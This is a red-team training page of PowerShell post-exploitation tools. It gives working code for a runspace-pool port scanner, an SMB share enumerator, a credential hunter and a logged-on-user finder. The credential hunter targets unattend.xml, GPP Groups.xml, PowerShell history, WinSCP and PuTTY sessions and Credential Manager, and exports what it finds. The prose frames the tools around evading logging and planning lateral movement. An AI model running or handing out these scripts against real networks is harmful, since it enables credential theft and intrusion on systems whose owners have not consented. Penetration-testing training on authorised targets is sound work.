---
layout: training-page
title: "PowerShell Network & Recon Tools — Red Team Academy"
module: "Tool Development"
tags:
  - powershell
  - network
  - recon
  - port-scanning
  - smb
  - credential-hunting
page_key: "tooldev-ps-network-recon"
render_with_liquid: false
---

# PowerShell Network & Recon Tools

## Overview

PowerShell has direct access to the full .NET framework and Windows API, making it an extremely capable platform for network reconnaissance on Windows targets. The tools in this module require no external binaries — everything runs through `System.Net.Sockets`, `System.Net.NetworkInformation`, WMI, and native cmdlets. All scripts are designed to run in constrained environments where third-party tools cannot be dropped.

## Async TCP Port Scanner (Runspace Pool)

PowerShell's `RunspacePool` creates a thread pool that runs multiple port probes in parallel without spawning new processes. This approach is significantly faster than sequential `Test-NetConnection` calls and produces no child process events (no `net.exe` or `nmap.exe` process creation logs).

```
# Invoke-PortScan.ps1 — parallel TCP port scanner using runspace pools.
# Usage: Invoke-PortScan -Targets "10.10.10.0/24" -Ports 22,80,443,445,3389,5985
# Output: array of [pscustomobject]@{IP; Port; State}

function Invoke-PortScan {
    param(
        [Parameter(Mandatory)][string]$Targets,   # CIDR or comma-separated IPs
        [int[]]$Ports    = @(22,80,443,445,3389,5985,8080,8443),
        [int]$Timeout    = 1000,    # milliseconds per TCP connect attempt
        [int]$Throttle   = 100      # max simultaneous runspaces
    )

    # ── Expand CIDR to individual IP addresses ────────────────────────────────
    function Expand-CIDR {
        param([string]$CIDR)
        if ($CIDR -match "^(\d+\.\d+\.\d+\.\d+)/(\d+)$") {
            $baseIP   = [System.Net.IPAddress]::Parse($Matches[1])
            $prefix   = [int]$Matches[2]
            $baseInt  = [System.BitConverter]::ToUInt32($baseIP.GetAddressBytes()[3..0], 0)
            $mask     = [uint32](0xFFFFFFFF -shl (32 - $prefix))
            $netInt   = $baseInt -band $mask
            $hostBits = 32 - $prefix
            $count    = [Math]::Pow(2, $hostBits) - 2  # exclude network + broadcast

            1..[int]$count | ForEach-Object {
                $ipInt  = $netInt + $_
                $bytes  = [System.BitConverter]::GetBytes([uint32]$ipInt)[3..0]
                ([System.Net.IPAddress]$bytes).ToString()
            }
        } else {
            $CIDR   # not CIDR — treat as single IP
        }
    }

    # ── Scriptblock executed by each runspace (one per IP:Port combo) ─────────
    $ProbeScript = {
        param([string]$IP, [int]$Port, [int]$TimeoutMs)
        $tcp = New-Object System.Net.Sockets.TcpClient
        try {
            $ar  = $tcp.BeginConnect($IP, $Port, $null, $null)
            $ok  = $ar.AsyncWaitHandle.WaitOne($TimeoutMs, $false)
            if ($ok -and $tcp.Connected) {
                [pscustomobject]@{ IP=$IP; Port=$Port; State="Open" }
            }
        } catch { } finally {
            $tcp.Close()
        }
    }

    $ips    = Expand-CIDR $Targets
    $pool   = [runspacefactory]::CreateRunspacePool(1, $Throttle)
    $pool.Open()
    $jobs   = @()

    # Submit all IP:Port combinations to the runspace pool
    foreach ($ip in $ips) {
        foreach ($port in $Ports) {
            $ps = [powershell]::Create().AddScript($ProbeScript).AddArgument($ip).AddArgument($port).AddArgument($Timeout)
            $ps.RunspacePool = $pool
            $jobs += [pscustomobject]@{ PS=$ps; Result=$ps.BeginInvoke() }
        }
    }

    # Collect results as runspaces complete
    $results = @()
    foreach ($job in $jobs) {
        $out = $job.PS.EndInvoke($job.Result)
        if ($out) { $results += $out }
        $job.PS.Dispose()
    }
    $pool.Close()

    $results | Sort-Object IP, Port
}
```

## SMB Share Enumeration

Enumerate all SMB shares across a range of hosts and identify shares accessible with the current user's credentials. Checks for world-readable shares, hidden admin shares, and share names that suggest sensitive data (backup, scripts, IT, etc.).

```
# Invoke-ShareEnum.ps1 — enumerate SMB shares across multiple hosts.
# Flags interesting share names and tests read access without mounting.

function Invoke-ShareEnum {
    param(
        [Parameter(Mandatory)][string[]]$Hosts,
        [System.Management.Automation.PSCredential]$Credential = $null
    )

    # Share name patterns that often contain sensitive data
    $interestingPatterns = @(
        "backup", "scripts", "IT", "admin", "share", "data", "finance",
        "deploy", "install", "config", "logs", "payroll", "hr", "infra"
    )

    $results = @()

    foreach ($host in $Hosts) {
        try {
            # Use WMI to enumerate shares without mounting — no net use events
            $wmiArgs = @{ ComputerName=$host; Class="Win32_Share"; ErrorAction="Stop" }
            if ($Credential) { $wmiArgs["Credential"] = $Credential }
            $shares = Get-WmiObject @wmiArgs

            foreach ($share in $shares) {
                $path = "\\$host\$($share.Name)"

                # Test read access by listing the root of the share
                $accessible = $false
                try {
                    $null = Get-ChildItem -Path $path -ErrorAction Stop -Force
                    $accessible = $true
                } catch { }

                # Check if share name matches interesting patterns
                $interesting = $interestingPatterns | Where-Object {
                    $share.Name -like "*$_*"
                }

                $results += [pscustomobject]@{
                    Host        = $host
                    ShareName   = $share.Name
                    SharePath   = $path
                    LocalPath   = $share.Path
                    Type        = switch ($share.Type) {
                        0        { "Disk" }
                        1        { "Print" }
                        2147483648 { "Admin Disk (hidden)" }
                        default  { "Other ($($share.Type))" }
                    }
                    Accessible  = $accessible
                    Interesting = ($interesting.Count -gt 0)
                }
            }
        } catch {
            Write-Verbose "[$host] Error: $_"
        }
    }

    # Highlight accessible and interesting shares
    $results | Where-Object Accessible | ForEach-Object {
        $flag = if ($_.Interesting) { "[!!!]" } else { "[+]" }
        Write-Host "$flag $($_.Host) - $($_.ShareName) ($($_.Type))" -ForegroundColor $(if ($_.Interesting) {"Red"} else {"Green"})
    }

    $results
}
```

## Credential Hunting in Files & Registry

After gaining a foothold, quickly search common locations where credentials are stored in plaintext or weakly encoded form. This includes configuration files, PowerShell history, unattended setup files, GPP passwords (Groups.xml), and Windows credential store entries.

```
# Invoke-CredHunt.ps1 — search filesystem and registry for stored credentials.
# Searches: PowerShell history, web.config, unattend.xml, GPP Groups.xml,
#           .env files, bash_history equivalents, IIS config, SQL connection strings.

function Invoke-CredHunt {
    param([string]$SearchRoot = "C:\")

    $found = @()

    # ── High-value file paths to check directly ───────────────────────────────
    $specificFiles = @(
        # Unattended Windows setup files (contain plaintext admin passwords)
        "C:\Windows\Panther\unattend.xml",
        "C:\Windows\Panther\Unattend\Unattend.xml",
        "C:\Windows\System32\sysprep\sysprep.xml",
        "C:\Windows\System32\sysprep\unattend.xml",

        # Group Policy Preferences passwords (GPP — encrypted but easily cracked)
        "C:\ProgramData\Microsoft\Group Policy\History\*\Machine\Preferences\Groups\Groups.xml",
        "\\$env:LOGONSERVER\SYSVOL\$env:USERDNSDOMAIN\Policies\*\MACHINE\Preferences\Groups\Groups.xml",

        # PowerShell console history (plaintext commands typed by admins)
        "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt",

        # WinSCP session config (stored passwords, base64 obfuscated)
        "HKCU:\SOFTWARE\Martin Prikryl\WinSCP 2\Sessions",

        # PuTTY saved sessions (hosts + sometimes passwords)
        "HKCU:\SOFTWARE\SimonTatham\PuTTY\Sessions"
    )

    foreach ($path in $specificFiles) {
        if (Test-Path $path) {
            $found += [pscustomobject]@{ Path=$path; Type="KnownCredFile"; Content="(exists)" }
            Write-Host "[!] Found credential file: $path" -ForegroundColor Red
        }
    }

    # ── Search filesystem for common credential patterns in file content ──────
    $extensions = "*.xml","*.config","*.ini","*.txt","*.ps1","*.bat","*.env","*.json","*.yaml"
    $searchTerms = @("password=","passwd=","pwd=","pass=","connectionstring","api_key","apikey","secret=","token=")

    Write-Host "[*] Scanning filesystem for credential patterns (this may take a while)..."
    Get-ChildItem -Path $SearchRoot -Include $extensions -Recurse -ErrorAction SilentlyContinue |
        Where-Object { $_.Length -lt 1MB } |   # skip huge files
        ForEach-Object {
            $file = $_
            try {
                $content = Get-Content $file.FullName -Raw -ErrorAction Stop
                foreach ($term in $searchTerms) {
                    if ($content -imatch [regex]::Escape($term)) {
                        # Extract the matching line for context
                        $lines = $content -split "`n" | Where-Object { $_ -imatch [regex]::Escape($term) }
                        $found += [pscustomobject]@{
                            Path    = $file.FullName
                            Type    = "CredPattern"
                            Content = ($lines | Select-Object -First 3) -join "; "
                        }
                        Write-Host "[+] $($file.FullName) — '$term'" -ForegroundColor Yellow
                        break  # one hit per file is enough
                    }
                }
            } catch { }
        }

    # ── Windows Credential Manager (cmdkey-stored credentials) ───────────────
    Write-Host "[*] Checking Windows Credential Manager..."
    $cmdkeyOutput = cmdkey /list 2>&1
    if ($cmdkeyOutput -match "Target") {
        Write-Host "[!] Stored credentials found in Credential Manager:" -ForegroundColor Red
        $cmdkeyOutput | Write-Host
        $found += [pscustomobject]@{ Path="CredentialManager"; Type="CmdKey"; Content=($cmdkeyOutput -join "`n") }
    }

    # ── Summary ───────────────────────────────────────────────────────────────
    Write-Host "`n[+] Total findings: $($found.Count)" -ForegroundColor Cyan
    $found | Export-Csv "credhunt_results.csv" -NoTypeInformation
    Write-Host "[+] Results exported to credhunt_results.csv"
    $found
}
```

## Network Session & Logged-On User Enumeration

Identify which users are currently logged on to remote hosts and which hosts have active network sessions — without running BloodHound or Sharphound. Uses WMI and the `NetSessionEnum` Win32 API via P/Invoke to map user-to-host relationships for lateral movement planning.

```
# Invoke-UserHunter.ps1 — find where users are logged on across the domain.
# WMI-based: no remote process creation, only DCOM traffic.

function Invoke-UserHunter {
    param(
        [string[]]$TargetHosts,             # list of hosts to query
        [string[]]$TargetUsers = @(),       # if set, alert when these users are found
        [System.Management.Automation.PSCredential]$Credential = $null
    )

    $sessions = @()

    foreach ($host in $TargetHosts) {
        try {
            # Win32_LoggedOnUser links logon sessions to their accounts
            $wmiArgs = @{ ComputerName=$host; Class="Win32_LoggedOnUser"; ErrorAction="Stop" }
            if ($Credential) { $wmiArgs["Credential"] = $Credential }

            $logons = Get-WmiObject @wmiArgs
            foreach ($logon in $logons) {
                $account = $logon.Antecedent
                # Extract domain and username from WMI reference string
                if ($account -match 'Domain="([^"]+)",Name="([^"]+)"') {
                    $domain   = $Matches[1]
                    $username = $Matches[2]

                    # Skip system accounts (SYSTEM, LOCAL SERVICE, NETWORK SERVICE)
                    if ($username -in @("SYSTEM","LOCAL SERVICE","NETWORK SERVICE")) { continue }

                    $entry = [pscustomobject]@{
                        Host     = $host
                        Domain   = $domain
                        Username = $username
                        FullUser = "$domain\$username"
                        IsTarget = ($TargetUsers -contains $username)
                    }
                    $sessions += $entry

                    $color = if ($entry.IsTarget) { "Red" } else { "Green" }
                    $flag  = if ($entry.IsTarget) { "[TARGET]" } else { "[+]" }
                    Write-Host "$flag $host — $domain\$username" -ForegroundColor $color
                }
            }
        } catch {
            Write-Verbose "[$host] $($_.Exception.Message)"
        }
    }

    $sessions | Sort-Object Host, Username
}
```
